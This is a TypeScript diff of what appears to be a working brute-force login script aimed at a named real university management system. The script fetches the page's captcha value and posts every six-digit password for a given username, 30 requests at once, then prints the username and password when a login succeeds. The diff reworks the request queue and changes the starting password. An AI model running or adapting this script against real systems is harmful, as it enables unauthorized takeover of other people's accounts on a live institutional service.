@@ -2,8 +2,7 @@ import FormData = require("form-data");
 import fetch, { FetchError } from "node-fetch"
 import cheerio = require("cheerio")
 import Utils from "./utils"
-import pQueue from "p-queue"
-import { reject } from "async";
+import async from 'async';
 const log = console.log
 const baseUrl = "http://mis.sse.ustc.edu.cn/"
 const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g
@@ -13,7 +12,8 @@ export function worker(username: string): Promise<any>{
   return new Promise((resolve,reject)=>{
     let success = false
     let view_state = ""
-    let password = "000000"
+    let password = "093500"
+    const concurrency = 30
     username = username.toLowerCase()
     log("username: ",username)
         /**
@@ -45,64 +45,53 @@ export function worker(username: string): Promise<any>{
         });
         log("sum:", sum);
         log("session", cookieJar);
-        const queue = new pQueue({concurrency:100})
-        const tryPass =()=>{
-            const mypass = password
-            password = increase(password)
+        const trypass = async.queue(function(password:string,done){
+          /**
+           * 组装数据
+           */
+          const formData = new FormData();
+          formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
+          formData.append("__VIEWSTATE", view_state);
+          formData.append("winLogin$sfLogin$txtUserLoginID", username);
+          formData.append('winLogin$sfLogin$txtPassword', password);
+          formData.append('winLogin$sfLogin$txtValidate', sum + "");
+          
+          return fetch(baseUrl + "default.aspx", {
+            method: "post",
+            headers: {
+              cookie: Array.from(cookieJar.values()).join(";")
+            },
+            body: formData
+          })
+          .then(login=>{
             /**
-             * 组装数据
+             * iflysse是登陆成功时拿到的cookie值
              */
-            const formData = new FormData();
-            formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
-            formData.append("__VIEWSTATE", view_state);
-            formData.append("winLogin$sfLogin$txtUserLoginID", username);
-            formData.append('winLogin$sfLogin$txtPassword', mypass);
-            formData.append('winLogin$sfLogin$txtValidate', sum + "");
-            
-            return fetch(baseUrl + "default.aspx", {
-              method: "post",
-              headers: {
-                cookie: Array.from(cookieJar.values()).join(";")
-              },
-              body: formData
-            }).then(login=>{
-              /**
-               * iflysse是登陆成功时拿到的cookie值
-               */
-              const iflysse = Utils.getCookie(login)
-              if (iflysse.length === 0) {
-                log("failed ", "password: ", mypass);
-              }
-              else {
-                log("success ", "用户名: ", username, "密码: ", mypass);
-                success = true;
-                resolve("success "+ "用户名: "+ username+ "密码: "+ mypass)
-              }
-              return
-            })
-            .catch(reject)
-          }
+            const iflysse = Utils.getCookie(login)
+            if (iflysse.length === 0) {
+              log("failed ", "password: ", password);
+            }
+            else {
+              log("success ", "用户名: ", username, "密码: ", password);
+              success = true;
+              resolve("success "+ "用户名: "+ username+ "密码: "+ password)
+            }
+            done()
+          })
+          .catch(e=>{
+            log(e)
+            done()
+          })
+        },concurrency)
         
-        for(let i=0;i<200;i++){
-          queue.add(
-            tryPass
-          )
-        }
-        queue.on("active",()=>{
-          log("size",queue.size)
-          if(queue.size<=100&&!success&&parseInt(password)<=999999){
-            queue.add(
-              tryPass
-            )
-          }else{
+        while(parseInt(password)<=999999&&!success){
+          trypass.push(password,()=>{
             if(success){
-              queue.pause()
+              trypass.kill()
             }
-            if(parseInt(password)>999999){
-              queue.pause()
-            }
-          }
-        })
+          })
+          password = increase(password)
+        }
       } catch (error) {
         log(error)
       }
